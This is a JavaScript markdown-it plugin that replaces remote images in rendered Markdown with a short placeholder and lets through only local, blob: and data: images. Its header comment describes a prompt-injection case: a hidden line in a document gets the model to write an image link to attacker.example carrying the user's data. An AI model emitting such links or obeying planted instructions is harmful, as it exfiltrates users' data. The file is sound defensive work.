// Markdown from the model or from a document is untrusted: a hidden line in a letter can make the model write
// ![](https://attacker.example/?q=<your data>), and the image request would carry the data out without a click.
// Images are shown only from this app (relative paths), blob: or data: URLs; any other image becomes a short note.
import { t } from '../i18n';

const LOCAL_IMAGE = /^(\/(?!\/)|blob:|data:image\/(png|jpeg|gif|webp);)/i;

export function blockRemoteImages(md) {
  const original = md.renderer.rules.image;
  md.renderer.rules.image = (tokens, idx, options, env, self) => {
    const token = tokens[idx];
    const src = token.attrGet('src') || '';
    if (LOCAL_IMAGE.test(src)) return original(tokens, idx, options, env, self);
    const alt = self.renderInlineAsText(token.children || [], options, env);
    const esc = md.utils.escapeHtml;
    return `<span class="blocked-image" title="${esc(src)}">[${esc(t('External image not loaded'))}${alt ? ': ' + esc(alt) : ''}]</span>`;
  };
  return md;
}

export const escapeHtml = (s) => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
